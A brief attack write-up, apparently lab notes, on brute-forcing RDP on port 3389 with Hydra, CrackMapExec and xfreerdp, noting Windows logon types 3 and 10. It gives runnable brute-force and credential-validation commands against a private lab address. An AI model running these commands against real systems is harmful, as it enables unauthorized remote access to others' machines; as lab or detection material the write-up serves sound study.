## Attack: Systematically try multiple passwords against RDP service to gain remote desktop access.

### How it Works:

- Attacker targets port 3389 (RDP)
- Uses wordlists of usernames and passwords
- Tools automate rapid credential attempts
- NLA pre-authenticates at network level (Type 3)
- Successful credentials allow full desktop access (Type 10)

### Tools Used:

- Hydra (primary brute force)
- CrackMapExec (credential validation)
- xfreerdp (manual connection after success)

```bash
# Brute force
hydra -L users.txt -P passwords.txt rdp://192.168.57.101 -t 4 -W 3

# Validate + connect
crackmapexec rdp 192.168.57.101 -u users.txt -p passwords.txt
xfreerdp /u:user1 /p:Password123! /v:192.168.57.101
``` 

**Goal:** Gain interactive remote desktop session on target machine.